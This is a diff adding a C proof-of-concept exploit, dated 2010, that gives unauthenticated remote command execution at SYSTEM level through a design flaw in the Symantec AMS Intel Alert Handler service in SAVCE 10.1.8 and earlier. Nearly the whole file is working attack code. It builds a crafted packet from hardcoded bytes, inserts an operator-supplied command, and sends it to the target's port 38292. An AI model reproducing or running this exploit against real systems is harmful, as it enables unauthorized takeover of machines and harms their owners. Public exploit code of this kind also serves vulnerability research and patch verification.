@@ -1,0 +1,152 @@
+// Remote command execution at System level without authentication
+// Advisory:https://www.foofus.net/?page_id=149
+// Exploit Title: Symantec AMS Intel Alert Handler service Design Flaw
+// Date: 07/28/10
+// Author: Spider
+// Software Link: http://www.foofus.net/~spider/code/ams-cmd.cpp.txt
+// Tested on: Symantec SAVCE 10.1.8 and earlier with AMS installed 
+
+// POC code to execute commands on system vulnerable to AMS2
+// design flaw of Intel Alert Handler service (hndlrsvc.exe)
+// within Symantec SAVCE 10.1.8 and earlier
+// ***Created by Spider July 2009***
+//--------------------Foofus.net-------------------------
+
+#include <stdio.h>
+#include <dos.h>
+#include <string.h>
+#include <winsock.h>
+#include <windows.h>
+
+unsigned char payload[1000];
+unsigned char inject1[] =
+"\xff\xff\xff\xff\xff\xff\xff\xff\x00\x00"
+"\x02\x00\x95\x94\xc0\xa8\x02\x64\x00\x00\x00\x00\x00\x00\x00\x00"
+"\xe8\x03\x00\x00\x50\x52\x47\x58\x43\x4e\x46\x47\x10\x00\x00\x00"
+"\x00\x00\x00\x00\x04\x41\x4c\x48\x44\x5c\x46\x00\x00\x01\x00\x00"
+"\x00\x01\x00\x0e\x00\x52\x69\x73\x6b\x20\x52\x65\x70\x61\x69\x72"
+"\x65\x64\x00\x25\x00\x53\x79\x6d\x61\x6e\x74\x65\x63\x20\x41\x6e"
+"\x74\x69\x56\x69\x72\x75\x73\x20\x43\x6f\x72\x70\x6f\x72\x61\x74"
+"\x65\x20\x45\x64\x69\x74\x69\x6f\x6e\x00\xf9\x1d\x13\x4a\x3f\x0c"
+"\x00\x4c\x41\x42\x53\x59\x53\x54\x45\x4d\x2d\x31\x00\x08\x08\x0a"
+"\x00\x52\x69\x73\x6b\x20\x4e\x61\x6d\x65\x00\x07\x00\x05\x00\x54"
+"\x65\x73\x74\x00\x08\x0a\x00\x46\x69\x6c\x65\x20\x50\x61\x74\x68"
+"\x00\x07\x00\x05\x00\x54\x65\x73\x74\x00\x08\x11\x00\x52\x65\x71"
+"\x75\x65\x73\x74\x65\x64\x20\x41\x63\x74\x69\x6f\x6e\x00\x07\x00"
+"\x05\x00\x54\x65\x73\x74\x00\x08\x0e\x00\x41\x63\x74\x75\x61\x6c"
+"\x20\x41\x63\x74\x69\x6f\x6e\x00\x07\x00\x05\x00\x54\x65\x73\x74"
+"\x00\x08\x07\x00\x4c\x6f\x67\x67\x65\x72\x00\x07\x00\x05\x00\x54"
+"\x65\x73\x74\x00\x08\x05\x00\x55\x73\x65\x72\x00\x07\x00\x05\x00"
+"\x54\x65\x73\x74\x00\x08\x09\x00\x48\x6f\x73\x74\x6e\x61\x6d\x65"
+"\x00\x0e\x00\x0c\x00\x4c\x41\x42\x53\x59\x53\x54\x45\x4d\x2d\x31"
+"\x00\x08\x13\x00\x43\x6f\x72\x72\x65\x63\x74\x69\x76\x65\x20\x41"
+"\x63\x74\x69\x6f\x6e\x73\x00\x07\x00\x05\x00\x54\x65\x73\x74\x00"
+"\x00\x07\x08\x12\x00\x43\x6f\x6e\x66\x69\x67\x75\x72\x61\x74\x69"
+"\x6f\x6e\x4e\x61\x6d\x65\x00\x22\x00\x20";
+
+unsigned char cmdother[] =
+"\x00\x08\x0c\x00\x43\x6f\x6d\x6d\x61\x6e\x64\x4c\x69\x6e\x65";
+
+unsigned char inject2[] =
+"\x00\x08\x08\x00\x52\x75\x6e\x41\x72\x67\x73\x00\x04\x00\x02\x00"
+"\x20\x00\x03\x05\x00\x4d\x6f\x64\x65\x00\x04\x00\x02\x00\x00\x00"
+"\x0a\x0d\x00\x46\x6f\x72\x6d\x61\x74\x53\x74\x72\x69\x6e\x67\x00"
+"\x02\x00\x00\x00\x08\x12\x00\x43\x6f\x6e\x66\x69\x67\x75\x72\x61"
+"\x74\x69\x6f\x6e\x4e\x61\x6d\x65\x00\x02\x00\x00\x00\x08\x0c\x00"
+"\x48\x61\x6e\x64\x6c\x65\x72\x48\x6f\x73\x74\x00\x0b\x00\x09\x00"
+"\x44\x45\x41\x44\x42\x45\x45\x46\x00\x00\x00\x00\x00";
+
+void banner (char *proga)
+	{
+	system("cls");
+	printf("\nUse: %s <ip>  <command>\n", proga);
+	}
+
+int main ( int argc, char *argv[] )
+{
+SOCKET sock;
+WSADATA wsa;
+struct sockaddr_in addr;
+
+printf("    __        ___      __   __                __    \n");
+printf(" | /  \\ |    /  _/___ |__| _\\ |___  _ __   | /  \\ | \n");
+printf("\\_\\\\  //_/   \\_  \\ . \\|  |/ . / ._\\| `_/  \\_\\\\  //_/\n");
+printf(" .'/()\\'.    /___/  _/|__|\\___\\___\\|_|     .'/()\\'. \n");
+printf(" \\ \\  / /        |_\\                       \\ \\  / / \n");
+printf("              AMS Remote Command Tool\n");
+
+	int port;
+	if ( argc < 3 ) 
+		{ 
+			banner(argv[0]);
+			exit(0); 
+		}
+
+char *ip_addr = argv[1];
+int length = (int)strlen(argv[2]);
+
+if (length > 128)
+		{
+		    printf("\n WARNING WARNING WARNING %s \n");
+		    printf("\n Input Command String Greater than 128 Characters is not Permited %s \n");
+		    exit (0);
+		}
+
+// building injection packet  
+
+	inject1[353] = length+3;
+	inject1[355] = length+1;
+	memcpy(payload,inject1,356);
+
+	int a = 356;
+ 	for (int i = 0; i<(length); i++)
+	  	{
+    			a=a+1;payload[a] = argv[2][i];    
+          	}
+
+	int b = a;
+	for (int i = 0; i<=14; i++)
+  		{
+    	 		b=b+1;payload[b] = cmdother[i];    
+		}
+
+	int c = b;
+	payload[c+2] = length+3;
+	payload[c+4] = length+1;
+
+	int d = c+5;
+	for (int i = 0; i<length; i++)
+  		{
+    			d=d+1;payload[d] = argv[2][i];    
+          	}
+
+	int e = d;
+	for (int i = 0; i<=109; i++)
+  		{
+    	 		e=e+1;payload[e] = inject2[i];    
+		}
+
+// setting up socket and sending packet
+
+	printf("[] preparing....\n");
+
+ 		WSAStartup(MAKEWORD(2,0), &wsa);
+		sock = socket(AF_INET, SOCK_STREAM, IPPROTO_IP);
+		addr.sin_family = AF_INET;
+		addr.sin_port = htons(38292);
+		addr.sin_addr.s_addr = inet_addr(ip_addr);
+
+	printf("[] connecting..\n");
+		if ( connect(sock, (struct sockaddr*)&addr, sizeof(addr)) == -1 )
+			{ printf("[-] connection failed!\n"); exit(0); }
+
+	printf("[] sending crafted packet 1 ...\n");
+		if ( send(sock, payload, sizeof(payload), 0) == -1 )
+			{ printf("[-] send failed!\n"); exit(0); }
+
+closesocket(sock);
+WSACleanup();
+
+return 0;
+
+}
